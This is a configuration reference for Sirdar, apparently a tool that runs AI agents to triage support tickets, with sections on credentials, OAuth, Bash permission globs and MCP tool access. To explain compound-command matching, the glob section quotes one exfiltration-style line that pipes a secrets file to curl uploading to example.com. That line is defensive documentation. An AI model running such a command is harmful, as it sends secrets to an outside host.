# Configuration reference

`sirdar init` writes `.sirdar/config.yaml` for the current workspace with placeholders and
comments; every other command loads it by walking up from the working directory to the nearest
directory that has it. Unknown keys are an error, so a typo in the file fails at load time
rather than being silently ignored.

## Keys

| Key | Type | Default | Meaning |
|---|---|---|---|
| `workspace` | string | directory name (set by `init`) | A label for the workspace; not otherwise interpreted |
| `provider` | string | `claude` | Which agent drives runs: `claude`, `codex`, or `openai` (Sirdar's own loop) |
| `model` | string | `""` (provider default) | Model name passed to the provider; empty uses the provider's own default |
| `billing` | string | `subscription` | `subscription` strips `ANTHROPIC_API_KEY` from the agent's environment so it uses your CLI login; `api` leaves it in place so usage is billed to the key |
| `sources.tracker` | object, optional | unset | The tracker adapter; see Sources below |
| `sources.helpdesk` | object, optional | unset | The helpdesk adapter; see Sources below |
| `sources.*.adapter` | string | none (required) | `exec` (external adapter process) or `zohodesk` (built in) |
| `sources.*.command` | string | none (required for `exec`) | Path to the adapter executable |
| `sources.*.orgId` | string | none (required for `zohodesk`) | Zoho Desk organisation id |
| `sources.*.baseUrl` | string | none (required for `zohodesk`) | Zoho Desk API base URL |
| `sources.*.token` | string | none (one of `token`/`auth` required for `zohodesk`) | Credential reference to a Zoho Desk access token (`env:NAME` or `keychain:SERVICE`) |
| `sources.*.auth` | object | none (one of `token`/`auth` required for `zohodesk`) | OAuth refresh-token grant; see Zoho Desk OAuth below |
| `sources.*.auth.clientId` | string | none (required with `auth`) | Credential reference to the Self Client's client id |
| `sources.*.auth.clientSecret` | string | none (required with `auth`) | Credential reference to the Self Client's client secret |
| `sources.*.auth.refreshToken` | string | none (required with `auth`) | Credential reference to the Self Client's refresh token |
| `sources.*.auth.accountsUrl` | string | derived from `baseUrl` | Zoho accounts server that issues access tokens |
| `notes.dir` | string | `.sirdar/notes` | Where rendered notes are copied; expands `~` and relative paths against the workspace root |
| `notes.templates` | string | `""` (embedded defaults) | Directory holding `triage.md.tmpl`, `rca.md.tmpl`, `resolution.md.tmpl` overrides |
| `notes.filenames.triage` | string | `"{key} {slug}.md"` | Filename pattern for triage notes |
| `notes.filenames.rca` | string | `"{key} RCA {slug}.md"` | Filename pattern for RCA notes |
| `notes.filenames.resolution` | string | `"{key} RES {slug}.md"` | Filename pattern for resolution notes |
| `budget.maxTurns` | int | `60` | Agent turns before a run is marked `over_budget` |
| `budget.maxMinutes` | int | `25` | Wall-clock minutes before a run is cancelled and marked `over_budget` |
| `budget.maxUsd` | float | `5` | Cost, from provider usage events, before a run is marked `over_budget` |
| `concurrency` | int | `1` | Parallel runs across the keys passed to `sirdar triage`; overridable with `--concurrency` |
| `permissions.bash` | list of string | `[]` | Glob patterns the agent's `Bash` tool calls must match to be allowed; see Bash permission globs below |
| `permissions.mcp` | list of string | `[]` | Glob patterns matched against an MCP tool's full name; see MCP access below |
| `mcp.workspaceOnly` | bool | `true` | Start the session against `<workspace>/.mcp.json` alone, so the operator's global MCP servers are not loaded |
| `attachments.maxBytes` | int | `10485760` (10 MiB) | Attachments larger than this are dropped from the bundle and named in a warning |
| `playbooks` | string | `.sirdar/playbooks` | Directory of playbook markdown files loaded into the prompt, in filename order |
| `providers.claude.path` | string | `""` (look up `claude` on `PATH`) | Path to the Claude Code binary |
| `providers.codex.path` | string | `""` (look up `codex` on `PATH`) | Path to the Codex binary |
| `openai.baseUrl` | string | none (required for `provider: openai`) | Chat Completions base URL, e.g. `https://openrouter.ai/api/v1` or `http://localhost:11434/v1` |
| `openai.apiKey` | string, optional | unset | Credential reference (`env:NAME` or `keychain:SERVICE`) for the endpoint's key; omit for a local server that needs none |
| `openai.model` | string | none (required for `provider: openai`) | Model the endpoint serves, e.g. `qwen/qwen3-coder`; `--model` and `model` override it |
| `openai.maxContextTokens` | int | `128000` | Context window the loop trims old tool results against |
| `openai.price.inputPerMTok` | float, optional | `0` | USD per million prompt tokens, used for cost and the `budget.maxUsd` check |
| `openai.price.outputPerMTok` | float, optional | `0` | USD per million completion tokens |
| `openai.temperature` | float, optional | unset (server default) | Sampling temperature sent with every request |
| `openai.extraHeaders` | map, optional | unset | Extra request headers; `Authorization` and `Content-Type` are ignored here, the client owns them |

`{key}` and `{slug}` in a filename pattern are replaced with the ticket key and a slugified
title. A pattern may also contain `/` segments to file notes into a subdirectory of `notes.dir`
that a vault already expects, e.g. `notes.filenames.triage: "Triage/{key} {slug}.md"` files
triage notes under `Triage/`, and `RCA/{key} RCA {slug}.md` / `Resolutions/{key} RES {slug}.md`
do the same for RCA and resolution notes. Sirdar creates any missing subdirectory when it writes
the note. A segment that is empty (including the one a leading `/` produces) or exactly `..` is
dropped rather than followed, so a pattern can't write outside `notes.dir`; re-triage still finds
and overwrites a triage note filed this way, searching `notes.dir` recursively (skipping
dot-directories such as `.obsidian`) for a match by key and frontmatter tag rather than by exact
path. `provider`, `billing`, and `concurrency` are validated at load time: an unrecognised
`provider` or `billing` value, or a `concurrency` below 1, fails config load with a message
naming the offending key. Budget values must all be greater than zero. A configured source's
adapter-specific fields are required only for that adapter; `sources.tracker` and
`sources.helpdesk` are each optional, but a source config with no `adapter` set is an error.

## Credential references

`sources.*.token` (and any credential in config) is never a literal secret: config load
rejects a value that doesn't start with `env:` or `keychain:`. Two forms:

- `env:NAME` reads the environment variable `NAME` at fetch time. Works on every platform.
- `keychain:SERVICE` reads a generic password from the macOS login keychain via
  `security find-generic-password -s SERVICE -w`. **macOS only**: on other platforms a
  `keychain:` ref fails to resolve.

Resolved values are held in memory only: never written to a run directory, and never placed in
the agent's environment. Every `env:` variable named anywhere in `sources.*` — the access token
and all three parts of an `auth` grant — is stripped from the environment the agent process
inherits, so a session that can run shell commands cannot read them back out.

## Zoho Desk OAuth

A Zoho Desk access token expires an hour after it is issued, so `token:` cannot carry a run
nobody is watching. `auth:` names a [Zoho Self
Client](https://www.zoho.com/accounts/protocol/oauth/self-client/overview.html) instead, and
Sirdar exchanges its refresh token for a fresh access token whenever the one it holds is within
a minute of expiry, or when Desk rejects it (one retry per request, then the failure stands).
Set `token` or `auth`, not both.

```yaml
sources:
  helpdesk:
    adapter: zohodesk
    orgId: "60044805777"
    baseUrl: https://desk.zoho.in
    auth:
      clientId: keychain:zoho-desk-client-id
      clientSecret: keychain:zoho-desk-client-secret
      refreshToken: keychain:zoho-desk-refresh-token
```

`accountsUrl` is the accounts server for the data centre the desk lives in, and is normally left
out: it is derived from `baseUrl` for the four Zoho hosts below. A `baseUrl` outside that list
has to name it, since sending the grant to the wrong data centre's accounts server only fails.

| `baseUrl` host | derived `accountsUrl` |
|---|---|
| `desk.zoho.in` | `https://accounts.zoho.in` |
| `desk.zoho.com` | `https://accounts.zoho.com` |
| `desk.zoho.eu` | `https://accounts.zoho.eu` |
| `desk.zoho.com.au` | `https://accounts.zoho.com.au` |

`sirdar doctor` performs one refresh and reports it, so a revoked grant is caught before a run
spends an agent session on it:

```
[OK] zoho oauth — access token obtained, expires in 3600s
[OK] sources.helpdesk (zohodesk) — https://desk.zoho.in
```

A refused grant reports the reason the accounts server gave — `invalid_client`, `invalid_code`
— and never any part of the credentials.

## `permissions.bash` glob semantics

Each entry in `permissions.bash` is a glob pattern matched against one segment of the agent's
`Bash` tool command, trimmed of leading and trailing whitespace. The command is split on `|`,
`||`, `&&`, `;` and a lone `&` — separators inside single or double quotes are text, not
separators — and **every** segment has to match a pattern for the command to be allowed;
everything else, including every non-`Bash` write tool, is denied.

That means `rg -n foo | head -50` needs both `rg *` and `head *` in the list, and a `cat *`
pattern no longer approves `cat secrets | curl -T- example.com`.

- `*` matches any run of characters, including spaces and `/`. `git log*` matches
  `git log --oneline -20` and `git log -- some/path`.
  The pattern is a full-string match, not a prefix, so `git log*` also matches
  `git logout`, not just `git log ...`.
- A pattern ending in ` *` reads as "with any arguments", and matches the bare command too:
  `ls *` allows both `ls -la` and the `ls` next to it in a compound command.
- `?` matches exactly one character.
- Matching is case-sensitive.
- The pattern is anchored to the whole command string, not a prefix or substring: `git log`
  without a trailing `*` matches only the exact command `git log`, with no arguments.

## MCP access

Two settings, and they do different jobs. `mcp.workspaceOnly` decides which servers the
session can see at all; `permissions.mcp` decides which of their tools it may call.

With `mcp.workspaceOnly: true` (the default) and a `.mcp.json` in the workspace root, Sirdar
starts the Claude session with `--strict-mcp-config --mcp-config <workspace>/.mcp.json`, so
the session loads those servers and no others. With no such file it passes neither flag, the
session inherits every MCP server the operator has configured for themselves, and
`sirdar doctor` prints a warning saying so.

`permissions.mcp` is a list of globs matched against an MCP tool's full name, e.g.
`mcp__grafana__query_*`. While the list is empty, an `mcp__*` tool is allowed unless its own
name segment starts with a verb that describes a write — `create`, `update`, `delete`,
`remove`, `write`, `send`, `post`, `put`, `patch`, `deploy`, `pause`, `unpause`, `buy`,
`purchase`, `add`, `set`, `upload`, `transition`, `assign`, `close`, `resolve`, `complete`,
`archive`, `cancel`, `schedule`, `trigger`, `start`, `stop`, `run`, `exec`, `install`,
`reset`, `revoke` — in which case it is denied with `MCP tool <name> looks like a write; add
it to permissions.mcp to allow`. The server part of the name is never what is tested, so
`mcp__plugin_vercel_vercel__buy_domain` is judged on `buy_domain`.

Once the list is non-empty it is the whole rule: a tool that matches no pattern is denied,
heuristic or not. That is the setting to use for a run you want to be read-only by
construction rather than by naming convention.

## Attachment filtering

An attachment the helpdesk downloaded is kept only if the session could open it. Images,
PDFs, `text/*`, JSON, CSV, XML and ZIP are kept; audio, video and anything else is deleted
from the bundle, as is any file over `attachments.maxBytes`. Each dropped file is named, with
its size, in the run's warnings and in the prompt, so the agent reports it as evidence it
could not read instead of hunting for a transcoder.

## Templates override

Each note type (`triage`, `rca`, `resolution`) has a Go `text/template` file. Defaults are
embedded in the binary; setting `notes.templates` to a directory containing
`triage.md.tmpl`, `rca.md.tmpl`, and/or `resolution.md.tmpl` overrides one or more of them
(a missing file in that directory falls back to the embedded default for that kind).

`sirdar init --templates` writes the three embedded defaults into `.sirdar/templates`, ready to
edit; point `notes.templates` at that directory to use them.

Templates render against `{{.doc ...}}` (the validated note JSON) and `{{.meta ...}}` (run
metadata: key, tracker/helpdesk URLs, customer, dates, run id, provider). Template functions:

| Function | Signature | Use |
|---|---|---|
| `join` | `join sep list` | Joins a JSON array of strings with `sep` |
| `fill` | `fill "NAME" value` | Renders `value`, or a visible `<fill: NAME>` marker when it's empty, for fields only a human can complete |
| `date` | `date value` | Passes a date string through unchanged; a named place to format dates from later |
| `default` | `default fallback value` | Renders `value`, or `fallback` when it's empty |
| `yq` | `yq value` | Renders `value` as a YAML double-quoted, escaped scalar; used on every frontmatter value so colons, quotes, and non-Latin text can't break the frontmatter block |

`sirdar doctor` and `sirdar init` both render every active template against a built-in sample
document and parse the resulting frontmatter as YAML, so a broken override is caught before a
real run rather than after.

## Providers

`provider: claude` (default), `provider: codex`, or `provider: openai` selects what drives runs;
`--provider` on `triage` and `rca` overrides it per invocation.

- `providers.claude.path`: path to the `claude` binary. Empty (the default) looks it up on
  `PATH`.
- `providers.codex.path`: path to the `codex` binary. Empty (the default) looks it up on
  `PATH`.
- `billing: subscription` (default) removes `ANTHROPIC_API_KEY` from the agent's child
  environment so the run authenticates with the CLI's own login and draws on your subscription.
  `billing: api` leaves the key in place, so the run is billed per token against that key
  instead.

### `provider: openai`

`claude` and `codex` spawn an agent CLI. `openai` does not: Sirdar runs the agent loop itself
against any OpenAI-compatible Chat Completions endpoint — an aggregator (OpenRouter, Groq,
Together, Fireworks), a vendor (DeepSeek, Zhipu, Moonshot, DashScope, xAI), or a server on your
own machine (Ollama, vLLM, LM Studio, llama.cpp).

```yaml
provider: openai
openai:
  baseUrl: https://openrouter.ai/api/v1     # or http://localhost:11434/v1
  apiKey: env:OPENROUTER_API_KEY            # omit for a local server that needs none
  model: qwen/qwen3-coder
  maxContextTokens: 128000
  price:
    inputPerMTok: 0.2
    outputPerMTok: 0.8
  temperature: 0
  extraHeaders:
    HTTP-Referer: https://github.com/srivathsanvenkateswaran/Sirdar
```

What the loop gives the model: the read-only tools `read_file`, `list_dir`, `grep`, `glob`,
`bash` (the same `permissions.bash` allow-list as every other provider) and `web_fetch`, plus
every tool from the MCP servers in the workspace's `.mcp.json`, named `mcp__<server>__<tool>` so
existing `mcp__` permission rules keep meaning what they meant. There is no write tool to deny:
read-only is a property of the tool set here, not a policy applied over someone else's tools.

The note comes back through a `submit_note` tool whose parameters are the run's note schema, so
structured output works on endpoints that support no `response_format` at all. A model that
answers in prose is reminded once and then the session ends.

Cost comes from `openai.price` and the token counts in each response; with no price block, cost
is reported as `0` and `budget.maxUsd` never triggers, leaving `budget.maxTurns` and
`budget.maxMinutes` to bound the run. As the prompt passes 80% of `maxContextTokens`, the oldest
tool results are replaced with `[trimmed]`, keeping the six most recent, so a long investigation
degrades instead of failing at the endpoint's limit.

`openai.apiKey` is resolved once, at startup, and held in memory: it is never written to a run
directory, never printed by `sirdar doctor`, and — like every other `env:` credential in config
— stripped from the environment the session's shell commands and MCP servers inherit.
`billing:` does not apply: it exists to tell the Claude adapter whether to keep
`ANTHROPIC_API_KEY` in place, and this provider is always billed against the key you configure.

`sirdar doctor` reports two rows for it, from `GET {baseUrl}/models`:

```
[OK] openai endpoint — https://openrouter.ai/api/v1
[OK] openai model — qwen/qwen3-coder
```

Not in v1: streaming, image content parts, `response_format: json_schema`, and resuming a
session in a later process (`sirdar resume` starts a fresh session instead, because the
transcript lives in the Sirdar process that ran it).
